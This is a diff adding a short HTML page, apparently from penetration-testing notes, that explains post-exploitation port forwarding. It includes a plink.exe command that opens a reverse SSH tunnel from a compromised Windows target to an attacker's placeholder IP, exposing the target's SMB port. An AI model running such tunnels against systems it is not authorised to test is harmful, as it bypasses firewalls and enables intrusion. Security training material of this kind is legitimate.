@@ -1,0 +1,15 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>More</title>
+</head><body>Port Forwarding<br/>
+This is useful for exposing inside services that aren’t available from outside the machine, normally due to firewall settings.<br/>
+<br/>
+Upload plink.exe to target.<br/>
+Start SSH on your attacking machine.<br/>
+<br/>
+For example to expose SMB, on the target run:<br/>
+plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS<br/>
+<br/>
+Note: As of the Fall Creators Update for Windows 10, OpenSSH has been introduced in beta for Windows, so I expect one day we may be able to use just regular old SSH commands for port forwarding, depending on if it’s enabled.</body></html>
